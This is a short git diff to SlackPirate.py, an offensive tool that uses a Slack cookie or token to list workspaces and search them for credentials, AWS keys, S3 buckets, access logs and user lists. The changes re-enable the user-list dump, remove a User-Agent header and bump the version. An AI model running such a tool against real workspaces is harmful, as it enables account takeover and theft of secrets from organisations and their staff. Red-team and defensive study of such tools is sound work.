@@ -147,7 +147,7 @@ def display_cookie_tokens(cookie, user_agent: str):
     tokens to long-term storage especially as they are valid pretty much forever. I'll leave as is for now...
     """
     try:
-        r = requests.get("https://slackpirate.slack.com", cookies=cookie, headers={'User-Agent': user_agent})
+        r = requests.get("https://slackpirate.slack.com", cookies=cookie)
         already_signed_in_match = re.findall(ALREADY_SIGNED_IN_TEAM_REGEX, str(r.content))
         if already_signed_in_match:
             print(termcolor.colored("This cookie has access to the following Workspaces: \n", "white", "on_blue"))
@@ -535,7 +535,7 @@ if __name__ == '__main__':
     parser.add_argument('--token', type=str, required=False,
                         help='Slack Workspace token. The token should start with XOX.')
     parser.add_argument('--version', action='version',
-                        version='SlackPirate.py v0.2. Developed by Mikail Tunç (@emtunc) with contributions from '
+                        version='SlackPirate.py v0.3. Developed by Mikail Tunç (@emtunc) with contributions from '
                                 'the amazing community! https://github.com/emtunc/SlackPirate/graphs/contributors')
     args = parser.parse_args()
 
@@ -554,7 +554,7 @@ if __name__ == '__main__':
         collected_output_info = check_token_validity(token=provided_token, user_agent=selected_agent)
         print_interesting_information(output_info=collected_output_info)
         dump_team_access_logs(token=provided_token, output_info=collected_output_info)
-        #dump_user_list(token=provided_token, output_info=collected_output_info)
+        dump_user_list(token=provided_token, output_info=collected_output_info)
         find_s3(token=provided_token, output_info=collected_output_info)
         find_credentials(token=provided_token, output_info=collected_output_info)
         find_aws_keys(token=provided_token, output_info=collected_output_info)
